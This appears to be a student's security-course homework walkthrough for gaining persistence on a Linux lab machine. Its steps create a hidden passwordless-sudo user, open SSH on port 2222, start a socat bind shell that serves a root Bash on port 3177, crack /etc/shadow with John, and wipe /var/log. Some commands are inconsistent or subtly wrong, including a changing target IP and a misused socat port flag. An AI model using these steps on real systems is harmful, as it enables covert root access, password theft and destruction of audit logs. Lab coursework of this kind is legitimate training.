## Submission for Unit 6 Advanced Bash Homework

Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
- `sudo su`
- `useradd sysd`
Give your secret user a password. 
- `passwd sysd`

Give your secret user a system UID < 1000.
- `usermod -u 300 sysd`

Give your secret user the same GID
- `groupmod -g 300 sysd` 

Give your secret user full sudo access without the need for a password.
- `visudo`
- `sysd ALL=(ALL:ALL) NOPASSWD:ALL`
Test that sudo access works without your password

```bash
su sysd
sudo -l

Matching Defaults entries for sysd on ubuntu-desktop-base:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysd may run the following commands on ubuntu-desktop-base:
    (ALL : ALL) NOPASSWD: ALL
``` 

## Allow ssh access over port 2222.

```bash
nano /etc/ssh/sshd_config
Port 22
Port 2222
``` 

Note the IP address of this system:
- `ifconfig`
- `eth0 IP: 192.168.73.39`
Exit the root accout.
- `exit`
SSH to the machine using your sysd account and port 2222
- `ssh sysd@<192.168.73.39> -p 2222`
Use sudo to switch to the root user
- `sudo su`

### Create a backdoor with socat
- Install socat
 - `apt install socat -y`
- Run Socat command in the background
  - `socat TCP4-Listen:3177,fork EXEC:/bin/bash &`
- Explain each part of the `socat` command:
  - `socat` Calls the socat program
  - `TCP4-Listen:3177` Listen for TCP connections on port `3177`
  - `,fork` Allows multiple TCP connections at once
  - `EXEC:/bin/bash` Run a Bash shell over this connection
  - `&` Run this command in the background
  [1] 6183
- Exit the SSH session
  - `exit`
- Test socat connection from the Ubuntu machine:
  - `$ socat STDIO TCP4:192.168.73.39 -p 3177
whoami
root`
- Close the `socat` connection.
  - `CTRL + C`

## Crack _all_ the passwords
Ssh back to the system using your sysd account
- `ssh sysd@<192.168.73.39>-p 2222`
- Use John to crack the entire /etc/shadow file
    - `sudo su`
    - `john /etc/shadow`

## Cover your tracks
- Use socat and a for loop to clear all system logs.
```bash
$  $ socat STDIO TCP4:172.28.128.49:3177
whoami
root
for i in $(ls /var/log); do echo '' > $i; done

```